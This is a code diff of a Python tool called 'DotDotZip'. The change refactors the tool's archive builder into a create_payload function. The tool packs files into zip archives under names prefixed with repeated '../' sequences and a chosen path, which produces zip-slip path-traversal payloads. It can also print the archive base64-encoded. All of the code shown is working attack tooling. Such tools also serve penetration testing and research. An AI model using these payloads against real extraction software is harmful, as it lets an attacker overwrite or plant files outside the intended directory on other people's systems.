@@ -22,6 +22,15 @@ def version_redundant():
     except metadata.PackageNotFoundError:
         return version_from_pyproject_toml()
 
+def create_payload(zip_name, traverse_count, prepend_path, pack_files):
+    with ZipFile(zip_name, 'w') as zf:
+        traverse_str = '../' * traverse_count
+        for file_name in pack_files:
+            try:
+                zf.write(file_name, arcname=f"{traverse_str}{prepend_path}/{file_name}")
+            except FileNotFoundError:
+                print(f"Error: The file '{file_name}' does not exist.")
+
 def main():
     parser = ArgumentParser(description=f"DotDotZip v. {version_redundant()}")
     
@@ -36,22 +45,11 @@ def main():
     
     if not args.zip_name:
         with BytesIO() as zip_buffer:
-            with ZipFile(zip_buffer, 'w') as zf:
-                for file_name in args.pack_files:
-                    try:
-                        zf.write(file_name, arcname=f"{traverse_str}{args.prepend_path}/{file_name}")
-                    except FileNotFoundError:
-                        print(f"Error: The file '{file_name}' does not exist.")
+            create_payload(zip_buffer, args.traverse_count, args.prepend_path, args.pack_files)
             zip_buffer.seek(0)
             print(base64.b64encode(zip_buffer.read()).decode('utf-8'))
-            
     else:
-        with ZipFile(args.zip_name, 'w') as zf:
-            for file_name in args.pack_files:
-                try:
-                    zf.write(file_name, arcname=f"{traverse_str}{args.prepend_path}/{file_name}")
-                except FileNotFoundError:
-                    print(f"Error: The file '{file_name}' does not exist.")
+        create_payload(args.zip_name, args.traverse_count, args.prepend_path, args.pack_files)
 
 if __name__ == '__main__':
     main()
